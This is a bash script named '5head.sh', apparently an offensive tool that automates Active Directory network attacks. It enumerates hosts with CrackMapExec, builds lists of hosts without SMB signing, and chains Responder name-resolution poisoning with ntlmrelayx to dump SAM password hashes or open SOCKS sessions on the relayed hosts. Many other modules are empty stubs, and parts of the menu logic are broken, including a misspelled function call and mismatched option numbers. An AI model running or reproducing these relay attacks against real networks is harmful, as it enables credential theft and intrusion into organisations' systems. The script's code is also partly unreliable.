#!/bin/bash

print_usage() {
        printf '
        5head.sh usage: [-h] [-t targetfile] [-i interface] [-d domain] [-c domain controller] [-u username] [-p password] [-h help]

        mandatory arguments:
          -t TARGETFILE          Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
          -i INTERFACE           Interface to use for network traffic

        useful arguments:
          -d  DOMAIN             Specific domain to perform authentication attempts on (NOT IMPLEMENTED YET)
	  -c  DOMAIN CONTROLLER  Domain controller (ip) to use for checks
	  -u  USERNAME           Username to use for authentication
          -p  PASSWORD           Password to use for authentication

        optional arguments:
          -h                     Print this help menu
';
}

if [[ $* == *-h ]]; then
        print_usage
        exit 1;
fi


### Argument helper
while getopts ":t:i:d:c:u:p:" o; do
    case "${o}" in
        t)
            targets=${OPTARG}
            ;;
	i)
            interface=${OPTARG}
            ;;
        d)
            domain=${OPTARG}
	    ;;
	c)
	    dc=${OPTARG}
	    ;;
        u)
            username=${OPTARG}
            ;;
        p)
            password=${OPTARG}
            ;;
        *)
            print_usage
            ;;
    esac
done
shift $((OPTIND-1))


### Tmux bootstrapping
if [ -z "${TMUX}" ]; then
        export session="5head"
        export targets=$targets
	export interface=$interface
        export domain=$domain
	export dc=$dc
        export username=$username
        export password=$password
        export PROMPT="%F{9}5head.sh%f > "
        window=0
        tmux new-session -d -s $session ./5head.sh
        tmux rename-window -t $session:$window 'main'
	tmux set-option -t $session mouse on
        tmux attach-session -t $session
        exit 1;
fi


### Colors
green='\e[32m'
cyan='\e[96m'
red='\e[91m'
clear='\e[0m'

ColorGreen () {
        echo -ne $green$1$clear
}
ColorCyan () {
        echo -ne $cyan$1$clear
}
ColorRed () {
        echo -ne $red$1$clear
}

## Main part executing inside of tmux
function packet_cap() {
        echo -e '[*] Starting packet captured in "packet_cap" window...\n'
        tmux new-window -n "packet_cap"
        tmux send-keys -t 5head:packet_cap 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:packet_cap 'clear' C-m
	tmux send-keys -t 5head:packet_cap 'bash -c "stty -echo;clear;echo -e \"[*] Starting packet capture on ${interface}...\n[*] Output will be written to loot/packet_capture.pcap\";stty echo"' C-m
        tmux send-keys -t 5head:packet_cap 'tcpdump -i $interface -w loot/packet_capture.pcap' C-m
}

function cme_enum_smb() {
        echo -e '[*] Enumerating SMB targets with CrackMapExec...\n'
        tmux new-window -n "cme_enum_smb"
        tmux send-keys -t 5head:cme_enum_smb 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:cme_enum_smb 'clear' C-m
        tmux send-keys -t 5head:cme_enum_smb 'deps/cme smb $targets >> loot/cme_enum_smb.txt' C-m
        tmux split-window -v -l 80%
	tmux send-keys -t 5head:cme_enum_smb 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
	tmux send-keys -t 5head:cme_enum_smb 'tail -f loot/cme_enum_smb.txt' C-m
}

function cme_enum_ldap() {
        echo -e '[*] Enumerating LDAP targets with CrackMapExec...\n'
        tmux new-window -n "cme_enum_ldap"
        tmux send-keys -t 5head:cme_enum_ldap 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:cme_enum_ldap 'clear' C-m
        tmux send-keys -t 5head:cme_enum_ldap 'deps/cme ldap $targets >> loot/cme_enum_ldap.txt' C-m
        tmux split-window -v -l 80%
        tmux send-keys -t 5head:cme_enum_ldap 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
        tmux send-keys -t 5head:cme_enum_ldap 'tail -f loot/cme_enum_ldap.txt' C-m
}

function cme_enum_mssql() {
        echo -e '[*] Enumerating MSSQL targets with CrackMapExec...\n'
        tmux new-window -n "cme_enum_mssql"
        tmux send-keys -t 5head:cme_enum_mssql 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:cme_enum_mssql 'clear' C-m
        tmux send-keys -t 5head:cme_enum_mssql 'deps/cme mssql $targets >> loot/cme_enum_mssql.txt' C-m
        tmux split-window -v -l 80%
        tmux send-keys -t 5head:cme_enum_mssql 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
        tmux send-keys -t 5head:cme_enum_mssql 'tail -f loot/cme_enum_mssql.txt' C-m
}

function gen_targets() {
	## SMB
	echo "[*] Generating smb_targets.txt list..."
	if test ! -f "loot/smb_targets.txt" && test -f "loot/cme_enum_smb.txt"; then
		grep -F -- "$domain" loot/cme_enum_smb.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
		echo -e "[+] smb_targets.txt generated...\n"
	else
		echo -ne $red'[-] ERROR: smb_targets.txt generation failed. Does loot/cme_enum_smb.txt exist?\n'$clear
	fi

	## LDAP
	echo "[*] Generating ldap_targets.txt list..."
        if test ! -f "loot/ldap_targets.txt" && test -f "loot/cme_enum_ldap.txt"; then
                grep -F -- "$domain" loot/cme_enum_ldap.txt | cut -d " " -f 10 > loot/ldap_targets.txt
                echo -e "[+] ldap_targets.txt generated...\n"
	else
		echo -ne $red'[-] ERROR: ldap_targets.txt generation failed. Does loot/cme_enum_ldap.txt exist?\n'$clear
        fi

	## MSSQL
	echo "[*] Generating mssql_targets.txt list..."
        if test ! -f "loot/mssql_targets.txt" && test -f "loot/cme_enum_mssql.txt"; then
                grep -F -- "$domain" loot/cme_enum_mssql.txt | cut -d " " -f 10 > loot/mssql_targets.txt
                echo -e "[+] mssql_targets.txt generated...\n"
        else
		echo -ne $red'[-] ERROR: mssql_targets.txt generation failed. Does loot/cme_enum_mssql.txt exist?\n'$clear
	fi

	## Multi
	echo "[*] Generating multi_targets.txt list..."
	if test ! -f "loot/multi_targets.txt"; then
		sed 's/^/smb:\/\//g' loot/smb_targets.txt >> loot/multi_targets.txt
		sed 's/^/ldap:\/\//g' loot/ldap_targets.txt >> loot/multi_targets.txt
		sed 's/^/mssql:\/\//g' loot/mssql_targets.txt >> loot/multi_targets.txt
		echo -e "[+] multi_targets.txt generated...\n"
	else
		echo -ne $red'[-] ERROR: multi_targets.txt already exists.\n'$clear
	fi
}

function ntlmrelay_smb_dump() {
	smb_dump_solo() {
		ColorCyan 'Enter target host: '
		read solo_target
		export solo_target=$solo_target
		echo -e '[*] Setting up Responder + Ntlmrelayx.py to one SMB target (SAM dump)...\n'
		tmux new-window -e "solo_target=${solo_target}" -n "relay"
		tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
		tmux split-window -e "solo_target=${solo_target}" -h -l 50%
		tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
		tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support' C-m
	}
	smb_dump_multi() {
		if test -f "loot/smb_targets.txt"; then
			echo -e '[*] Setting up Responder + Ntlmrelayx.py to SMB targets file (SAM dump)...\n'
			tmux new-window -n "relay"
        	        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
                	tmux split-window -h -l 50%
                	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
                	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
		else
			echo -ne $red'[-] ERROR: smb_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
		fi
	}
	ColorCyan '\nRelay to an individual host or a list of targets?\n'
	ColorGreen '1)' && echo -e " Specific host"
	ColorGreen '2)' && echo -e " Targets file"
	ColorCyan 'Choose an option: '
	        read a
        	case $a in
                	1) smb_dump_solo ;;
                	2) smb_dump_multi ;;
                	*) echo -e "Invalid command entered... exiting\n\n";
        	esac
}

function ntlmrelay_smb_socks() {
       smb_socks_solo() {
                ColorCyan 'Enter target host: '
                read solo_target
                export solo_target=$solo_target
                echo -e '[*] Setting up Responder + Ntlmrelayx.py to one SMB target (socks)...\n'
                tmux new-window -e "solo_target=${solo_target}" -n "relay"
                tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support -socks' C-m
        }
        smb_socks_multi() {
                if test -f "loot/smb_targets.txt"; then
                        echo -e '[*] Setting up Responder + Ntlmrelayx.py to SMB targets file (socks)...\n'
                        tmux new-window -n "relay"
                        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
                        tmux split-window -h -l 50%
                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support -socks' C-m
                else
                        echo -ne $red'[-] ERROR: smb_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
                fi
        }
        ColorCyan '\nRelay to an individual host or a list of targets?\n'
        ColorGreen '1)' && echo -e " Specific host"
        ColorGreen '2)' && echo -e " Targets file"
        ColorCyan 'Choose an option: '
                read a
                case $a in
                        1) smb_socks_solo ;;
                        2) smb_socks_multi ;;
                        *) echo -e "Invalid command entered... exiting\n\n";
                esac

}

function ntlmrelay_ldap_socks() {
        echo "temp"
}

function ntlmrelay_ldap_rbcd() {
        echo "temp"
}

## TODO
function ntlmrelay_mssql_socks() {
        echo "temp"
}

## TODO
function ntlmrelay_multi() {
        echo "temp"
}

function mitm6_ldap_socks() {
        echo "temp"
}

function mitm6_ldap_rbcd() {
        echo "temp"
}

function asreproast() {
        echo "temp"
}

function kerberoast() {
        echo "temp"
}

function share_enum() {
        echo "temp"
}

function bloodhound_py() {
        echo "temp"
}

function coerce_check() {
        echo "temp"
}

function ldap_sign_scan() {
        echo "temp"
}

function maq() {
	echo "temp"
}


## Main function area
printf '
    ____                                  __        __          __
   / __ \___  ____  ___  ____ _____ _____/ /__     / /   ____ _/ /_  _____
  / /_/ / _ \/ __ \/ _ \/ __ `/ __ `/ __  / _ \   / /   / __ `/ __ \/ ___/
 / _, _/  __/ / / /  __/ /_/ / /_/ / /_/ /  __/  / /___/ /_/ / /_/ (__  )
/_/ |_|\___/_/ /_/\___/\__, /\__,_/\__,_/\___/  /_____/\__,_/_.___/____/
                      /____/
'

echo "[*] Starting 5head.sh..."
if [ ! -d "./loot" ]; then
        mkdir loot
fi
touch ~/.hushlogin
PROMPT="%F{9}5head.sh%f > "

### Menu Stuff
menu(){
echo -ne "
~ 5head.sh ~
$(ColorGreen '1)') Enum
$(ColorGreen '2)') Poison
$(ColorGreen '3)') AD
$(ColorGreen '0)') Detach tmux
$(ColorCyan 'Choose a module:') "
        read a
        case $a in
                1) enum ;;
                2) poison ;;
		3) ad ;;
                0) tmux detach ;;
                ash) debug ; menu ;;
                *) echo "Invalid command entered"; menu ;;
        esac
}

enum(){
echo -ne "
~ 5head.sh -> enum ~
$(ColorGreen '1)') Packet capture + search for suspicious traffic
$(ColorGreen '2)') SMB enumeration + target generation (CME)
$(ColorGreen '3)') LDAP enumeration + target generation (CME)
$(ColorGreen '4)') MSSQL enumeration + target generation (CME)
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
                1) packet_cap ; enum ;;
                2) cme_enum_smb ; enum ;;
		3) cme_enum_ldap ; enum ;;
		4) cme_enum_mssql ; enum ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; enum ;;
        esac
}

poison(){
echo -ne "
~ 5head.sh -> poison ~
$(ColorGreen '1)') Generate target lists from CME output
$(ColorGreen '## LLMNR/NBT-NS/MDNS')
$(ColorGreen '2)') SMB: Responder + ntlmrelayx (SAM dump)
$(ColorGreen '3)') SMB: Responder + ntlmrelayx (socks)
$(ColorGreen '4)') LDAP: Responder + ntlmrelayx (socks)
$(ColorGreen '5)') LDAP: Responder + ntlmrelayx (delegate access)
$(ColorGreen '6)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '7)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '## DHCPv6')
$(ColorGreen '8)') LDAP: mitm6 + ntlmrelayx (socks)
$(ColorGreen '9)') LDAP: mitm6 + ntlmrelayx (delegate access)
$(ColorGreen '## Other')
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
		1) gen_targets ; poison ;;
		2) ntlmrelay_smb_dump ; poison ;;
		3) ntlmrelay_smb_socks ; poison ;;
		4) ntlmrelay_ldap_socks ; posion ;;
		5) ntlmrelay_ldap_rbcd ; poison ;;
		6) ntlmrelay_mssql_socks ; poison ;;
		7) ntlmrelay_multi ; poison ;;
		8) mitm6_ldap_socks ; poison ;;
		9) mitm6_ldap_rbcd ; poison ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; poison ;;
        esac
}

ad(){
echo -ne "
~ 5head.sh -> AD ~ $(ColorRed 'Creds required')
$(ColorGreen '1)') Search for ASREPRoastable users
$(ColorGreen '2)') Search for Kerberoastable users
$(ColorGreen '3)') Enumerate shares on domain hosts
$(ColorGreen '4)') Search for ADCS targets
$(ColorGreen '5)') Python Bloodhound ingestor $(ColorRed 'Note: YMMV')
$(ColorGreen '6)') Enumerate hosts for authentication coercion mechanisms
$(ColorGreen '7)') Check LDAP Signing and Channel Binding
$(ColorGreen '8)') Check Machine-Account-Quota
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
		1) asreproast ; ad ;;
		2) kerberoast ; ad ;;
		3) share_enum ; ad ;;
		4) bloodhound_py ; ad ;;
		5) coerce_check ; ad ;;
		6) ldap_sign_scan ; ad ;;
		7) maq ; ad ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; ad ;;
        esac
}

menu

## To-do
# 1. Need a dependenacy checker startup thing
# 2. need env variable + variable safety checker exeter thing
# 3. Add checker to ensure 5head.sh is executed from base wd of repo
# 4. implement ntlmrelayx + mssql (need testing)
# 5. implement ntlmrelayx multi protocol (need testing)

